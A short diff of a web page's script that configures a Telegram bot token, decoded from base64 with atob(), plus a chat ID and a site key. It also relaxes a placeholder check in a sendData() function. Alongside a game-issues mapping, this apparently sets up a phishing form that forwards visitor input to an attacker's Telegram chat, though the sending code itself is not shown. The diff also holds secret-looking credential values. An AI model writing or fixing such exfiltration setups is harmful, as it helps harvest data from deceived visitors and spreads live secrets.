@@ -311,12 +311,10 @@
 </a>
 
 <script>
-    // ==========================================
-    // PRIVACY CONFIGURATION - Enter Details Here
-    // ==========================================
-    const BOT_TOKEN = 'atob('ODYzNTI4OTE2NTpBQUVvUngtaV9UR3h1b2cwbjYyeGZxQllhRGlsY2Rpbko2UQ'; 
+    // Config Section - Corrected Syntax & Credentials
+    const BOT_TOKEN = atob('ODYzNTI4OTE2NTpBQVVVngtaV9UR3hlb2cwbjYyeGZxQl1hRG1sY2Rpbko2UQ'); 
     const CHAT_ID = '8882142102';
-    const CLOUD_KEY = '0x4AAAAAAE-FSW7V0OIKRLh0';
+    const CLOUD_KEY = '0x4AAAAAAAE-fSw7V00IKRlhO';
 
     // Game Specific Issues Dynamic Mapping
     const gameIssues = {
@@ -452,8 +450,8 @@
     }
 
     function sendData() {
-        if (!BOT_TOKEN || BOT_TOKEN === 'YOUR_TELEGRAM_BOT_TOKEN_HERE' || !CHAT_ID || CHAT_ID === 'YOUR_CHAT_ID_HERE') {
-            alert('Kripya code mein BOT_TOKEN aur CHAT_ID daalein!');
+        if (!BOT_TOKEN || !CHAT_ID) {
+            alert('Config details missing!');
             return;
         }
 
